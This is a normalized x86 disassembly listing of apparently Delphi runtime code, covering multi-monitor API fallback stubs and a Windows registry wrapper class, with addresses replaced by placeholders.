mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4200dc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404e44
sub_4201c0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4200dc
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_420248
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4200dc
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_4202d8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4200dc
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_420248
sub_42036e
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4200dc
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4203ef
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4200dc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4204dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4200dc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4205b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4200dc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_420684
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4200dc
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42081f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_420845
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42084c
retn
sub_420c24
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
or al 0x42
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] dl
inc ebp
push edx
imul esi [ gs : bp + di + 0x74 ] 0x78457972
arpl [ ebp + 0x70 ] sp
je r-xdata
jb r-xdata
outsd
outsb
nop
int3
clc
add dh [ ebp + 0x4 ]
mov al 0x2
jmp r-xdata
retn
sub_420ce8
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
pop ecx
pop edx
pop ebx
retn
sub_420d28
dec al
je r-xdata
mov eax 0x1
retn
dec al
je r-xdata
mov eax 0x2
retn
dec al
je r-xdata
mov eax 0x4
retn
dec al
je r-xdata
mov eax 0x3
retn
jmp r-xdata
xor eax eax
retn
sub_420d58
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
mov al 0x1
retn
cmp eax 0x4
jne r-xdata
mov al 0x2
jmp r-xdata
cmp eax 0x3
jne r-xdata
mov al 0x3
jmp r-xdata
retn
xor eax eax
mov al 0x4
jmp r-xdata
sub_420d80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx 0x80000001
mov eax esi
call sub_420e5c
mov [ esi + 0x18 ] 0xf003f
mov [ esi + 0xc ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_420dc4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_420d80
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_420e00
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_420e2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_420e2c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call RegCloseKey
xor eax eax
mov [ ebx + 0x4 ] eax
lea eax [ ebx + 0x10 ]
call sub_404e44
push eax
call RegFlushKey
sub_420e5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
call sub_420e2c
push eax
call RegCloseKey
mov [ ebx + 0x14 ] 0x0
sub_420e88
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_420e2c
mov [ ebx + 0x4 ] esi
lea eax [ ebx + 0x10 ]
mov edx edi
call sub_404e98
pop edi
pop esi
pop ebx
retn
sub_420ec4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_420fc9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_420d14
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4053c4
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi + 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov edx ebx
mov eax esi
call sub_420eac
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x6 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x6 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov eax [ esi + 0x18 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov edx ebx
mov eax esi
call sub_420eac
push eax
call RegCreateKeyExA
test eax eax
sete [ ebp - 0x6 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420fd0
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_420e88
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4051e4
sub_420fe8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_421182
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_420d14
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov edx ebx
mov eax esi
call sub_420eac
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4053c4
lea eax [ ebp - 0xc ]
push eax
push 0x20009
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov edx ebx
mov eax esi
call sub_420eac
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ esi + 0x18 ] 0x20019
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x1
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov edx ebx
mov eax esi
call sub_420eac
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ esi + 0x18 ] 0x20009
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_420e88
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421189
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov [ esi + 0x18 ] 0x1
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_420e88
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_420e88
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4051e4
sub_4211a0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42130a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_420d14
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_421784
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4053c4
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
movzx edx [ ebp - 0x11 ]
mov eax [ ebp - 0xc ]
call sub_420eac
push eax
call RegDeleteKeyA
test eax eax
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421311
lea eax [ ebp - 0x3c ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
xor eax eax
push ebp
push sub_4212c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_420ec0
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_421338
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_420ec0
mov eax [ ebp - 0x1c ]
push eax
call RegCloseKey
retn
mov ecx [ ebp - 0x34 ]
inc ecx
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_404f34
mov ebx [ ebp - 0x38 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_405324
push eax
push ebx
mov eax [ ebp - 0x1c ]
push eax
call RegEnumKeyExA
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_405324
mov edx eax
lea eax [ ebp - 0x3c ]
call sub_40503c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0xc ]
call sub_4211a0
sub_421318
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_405324
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegDeleteValueA
test eax eax
sete al
pop esi
pop ebx
retn
sub_421338
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
xor ecx ecx
mov edx 0x1c
call sub_403728
lea eax [ ebx + 0x14 ]
push eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
lea eax [ ebx + 0xc ]
push eax
lea eax [ ebx + 0x8 ]
push eax
push 0x0
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0x0
push 0x0
push 0x0
mov eax [ esi + 0x4 ]
push eax
call RegQueryInfoKeyA
test eax eax
sete al
mov edx [ rw-data ]
cmp [ edx + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
mov edx [ ebx + 0x4 ]
add [ ebx + 0x4 ] edx
mov edx [ ebx + 0xc ]
add [ ebx + 0xc ] edx
sub_4213a0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_421458
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax edi
call sub_421338
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42145f
lea eax [ ebp - 0x2c ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov ecx [ ebp - 0x24 ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404f34
mov ebx [ ebp - 0x28 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push esi
mov eax [ edi + 0x4 ]
push eax
call RegEnumKeyExA
mov eax [ ebp - 0x4 ]
call sub_405324
mov edx eax
lea eax [ ebp - 0x2c ]
call sub_40503c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
dec ebx
jne r-xdata
sub_421468
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_421520
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax edi
call sub_421338
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421527
lea eax [ ebp - 0x2c ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov ecx [ ebp - 0x1c ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404f34
mov ebx [ ebp - 0x20 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push esi
mov eax [ edi + 0x4 ]
push eax
call RegEnumValueA
mov eax [ ebp - 0x4 ]
call sub_405324
mov edx eax
lea eax [ ebp - 0x2c ]
call sub_40503c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
dec ebx
jne r-xdata
sub_421530
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov eax ebp
xor ecx ecx
mov edx 0x8
call sub_403728
lea eax [ ebp + 0x4 ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
push 0x0
mov eax edi
call sub_405324
push eax
mov eax [ esi + 0x4 ]
push eax
call RegQueryValueExA
test eax eax
sete bl
mov eax [ esp ]
call sub_420d58
mov [ ebp ] al
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_421580
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_421530
test al al
je r-xdata
or eax 0xffffffff
mov eax [ esp + 0x4 ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4215a8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_421530
test al al
je r-xdata
xor eax eax
movzx eax [ esp ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4215d0
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
mov ebx edi
test ebx ebx
je r-xdata
inc ebx
push ebx
push 0x1
mov eax edi
call sub_405324
mov ecx eax
mov edx ebp
mov eax esi
call sub_4216a8
pop ebp
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_421600
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov edx ebp
mov eax esi
call sub_421580
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404e44
mov eax edi
mov ecx ebx
xor edx edx
call sub_404f34
push ebx
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi ]
call sub_405324
mov ecx eax
mov edx ebp
mov eax esi
call sub_421710
cmp [ esp ] 0x1
je r-xdata
mov eax [ edi ]
call sub_405324
call sub_40a308
mov edx eax
mov eax edi
call sub_4055ac
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_420ce8
jmp r-xdata
sub_421678
push ebx
add esp 0xfffffff8
mov ebx edx
push 0x4
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx ebx
call sub_421710
cmp [ esp + 0x4 ] 0x3
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_420ce8
sub_4216a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
call sub_420d28
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
mov eax edi
call sub_405324
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegSetValueExA
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
sub_421710
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax esi
call sub_405324
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegQueryValueExA
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_420d58
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
sub_421784
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42180a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_420d14
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ esi + 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov edx ebx
mov eax esi
call sub_420eac
push eax
call RegOpenKeyExA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
